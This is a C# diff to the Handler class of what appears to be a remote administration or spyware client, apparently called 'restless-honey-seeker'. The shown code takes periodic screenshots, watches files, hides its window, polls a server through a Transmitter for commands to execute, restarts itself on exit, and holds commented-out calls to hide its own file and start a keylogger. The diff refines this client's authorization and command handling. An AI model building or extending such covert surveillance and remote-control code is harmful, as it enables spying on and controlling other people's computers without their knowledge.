@@ -1,5 +1,4 @@
-﻿using Library;
-using Models;
+﻿using Models;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -14,24 +13,32 @@ using System.Windows.Forms;
 
 namespace Library
 {
-    public delegate void OnScreenshotDelegate(object sender, System.Drawing.Bitmap bitmapImage);
-    public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);
+    public class AuthEventArgs : EventArgs
+    {
+        public bool IsAuthenticated { get; set; }
+        public AuthEventArgs()
+        {
 
+        }
+    }
+
+    public delegate void OnScreenshotDelegate(object sender, Bitmap bitmapImage);
+    public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);
     public delegate void OnCommandDelegate(object sender, ECommand e);
+    public delegate void OnAuthorizedHandler(object sender, AuthEventArgs e);
 
     public class Handler
     {
         private bool isQuitting = false;
-        public Transmitter Transmitter { get; set; }
-        public System.Drawing.Bitmap Screenshot { get; private set; }
-        public FileDirHandler FileDirInfo { get; private set; }
         private FileSystemWatcher watcher;
         private Timer screenShotTimer;
-
-
+        public Transmitter Transmitter { get; set; }
+        public Bitmap Screenshot { get; private set; }
+        public FileDirHandler FileDirInfo { get; private set; }
         public event OnScreenshotDelegate OnScreenshot;
         public event OnFileEventDelegate OnFileEvent;
         public event OnCommandDelegate OnCommandEvent;
+        public event OnAuthorizedHandler OnAuthorizedEvent;
 
         #region Singleton
         private static Handler instance;
@@ -374,7 +381,10 @@ namespace Library
             this.CONNECTION_TIMEOUT = option.CONNECTION_TIMEOUT;
             this.CONNECTION_INTERVAL = option.CONNECTION_INTERVAL;
             this.StartNewProcessOnExit = option.startNewProcessOnExit;
-            HideForm();
+            if (option.HideOnStart)
+            {
+                HideForm();
+            }
             Application.ApplicationExit += Application_ApplicationExit2;
             thisApp = Assembly.GetExecutingAssembly();
             //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
@@ -394,10 +404,10 @@ namespace Library
             //Clipboard.SetText(appDir); MessageBox.Show(appDir);
             DirTransfers = Path.Combine(AppDir, APPDIR_TRANSFERS);
             DirPlugins = Path.Combine(AppDir, APPDIR_PLUGINS);
-            // temporary while testing
-#if DEBUG
-            DirPlugins = @"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\x64\Debug";
-#endif
+            //            // temporary while testing
+            //#if DEBUG
+            //            DirPlugins = @"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\x64\Debug";
+            //#endif
             CreateDirectory(AppDir);
             CreateDirectory(DirTransfers);
             CreateDirectory(DirPlugins);
@@ -457,6 +467,7 @@ namespace Library
         bool ConnectAndSetup()
         {
             bool isAuthorized = Handler.Instance.Transmitter.Authorize();
+            //OnAuthorizedEvent(this, new AuthEventArgs() { IsAuthenticated = isAuthorized });
             if (isAuthorized)
             {
                 //Handler.Instance.StartKeyLogger();
@@ -484,13 +495,13 @@ namespace Library
                     if (Handler.Instance.Transmitter.TSettings == null) return;
                     Handler.Instance.Transmitter.UpdateLastActive();
                     if (Handler.Instance.Transmitter.TSettings.HasExectuted) return;
+                    Handler.Instance.Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
                     //var command = Handler.Instance.Transmitter.GetCommand();
                     //if (!command.ToString().Equals("DO_NOTHING"))
                     //{
                     //    MessageBox.Show(command.ToString());
                     //}
                     OnCommandEvent(this, Handler.Instance.Transmitter.TSettings.Command);
-                    Handler.Instance.Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
                 };
                 transmitTimer.Enabled = true;
             }
